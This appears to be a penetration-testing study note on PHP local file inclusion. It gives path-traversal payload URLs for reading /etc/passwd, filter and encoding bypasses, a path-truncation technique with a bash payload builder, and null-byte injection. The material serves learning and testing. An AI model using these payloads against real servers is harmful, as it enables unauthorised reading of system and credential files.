_Basic Payload_
```url
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd #path traversal
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd #bypass prefix
```

_Simple Bypass_
```url
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd #bypass ../ remove
?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64 #url encoding all characters
```

**Some Bypass**
[[command-injection#Bypass]]

_Approved Path_
Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path.

## Appended Extensions
### Path Truncation 
 They are `obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4`.

In earlier versions of PHP, defined strings have a maximum length of 4096 characters.
If a longer string is passed, it will simply be `truncated`, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (`/etc/passwd/.`) then the `/.` would also be truncated, and PHP would call (`/etc/passwd`). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`). Similarly, a current directory shortcut (`.`) in the middle of the path would also be disregarded (e.g. `/etc/./passwd`).

If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (`.php`) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to `start the path with a non-existing directory` for this technique to work.

```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

_Build Payload_
```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
### Null Bytes
PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it.
```url
/etc/passwd%00
```
